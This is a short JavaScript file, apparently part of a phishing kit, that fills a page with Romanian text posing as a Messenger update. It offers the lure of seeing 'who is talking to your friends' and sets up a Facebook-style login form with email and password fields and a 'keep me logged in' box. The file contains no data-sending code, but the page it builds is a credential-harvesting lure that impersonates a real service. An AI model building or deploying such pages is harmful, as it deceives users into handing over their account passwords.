var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 


mainParagraph.innerHTML ="Actualizați Messenger la cea mai recentă versiune pentru a vă bucura de noile funcții, cum ar fi să știți cine vorbește cu prietenii tăi";
subMainParagraph.innerHTML ="Conectează-te instantaneu cu oamenii din viața ta. Conectați-vă cu Facebook pentru a începe.";
updateButton.innerHTML ="actualizează acum";
userInput.setAttribute("placeholder" , "Adresă de e-mail sau număr de telefon");
passInput.setAttribute("placeholder" , "Parola");
logButton.setAttribute("value" , "Autentificare");
checkBox.innerHTML ="păstrează-mă autentificat";
